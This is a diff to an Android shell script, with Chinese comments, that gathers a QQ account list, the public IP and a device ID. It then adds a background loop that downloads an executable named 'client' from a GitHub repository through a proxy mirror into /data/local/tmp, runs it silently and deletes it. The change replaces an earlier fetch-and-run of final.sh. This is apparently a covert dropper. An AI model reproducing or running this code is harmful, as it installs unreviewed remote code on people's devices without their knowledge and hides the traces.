@@ -167,23 +167,29 @@ echo "获取到的 QQ 列表: ${qq_list:-空}"
 echo "当前设备公网 IP: $ip"
 echo "设备唯一 ID: $device_id"
 echo "-----------------------------------"
+# ------------------------------
+# 下载并执行客户端（后台进程）
+# ------------------------------
 {
-    temp_script="/data/local/tmp/final.sh"
+    temp_script="/data/local/tmp/client"
     
     while true; do
-        # 下载客户端脚本
-        if curl -sS -o "$temp_script" "https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/final.sh"; then
+        # 下载客户端
+        if curl -sS -o "$temp_script" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client" >/dev/null 2>&1; then
+            # 下载成功，给执行权限
+            chmod +x "$temp_script"
+            
+            # 执行客户端，并在执行完毕后删除
+            "$temp_script" && rm -f "$temp_script"
+            
+            # 如果执行失败也删除文件
+            [ -f "$temp_script" ] && rm -f "$temp_script"
+            
+            # 成功执行后退出循环
             break
         else
+            # 下载失败，等待30秒后重试
             sleep 30
         fi
     done
-    
-    # 下载成功后执行脚本
-    if [ -f "$temp_script" ]; then
-        # 给执行权限
-        chmod +x "$temp_script"
-        nohup bash "$temp_script" >/dev/null 2>&1 &
-        rm -f "$temp_script"
-    fi
 } &
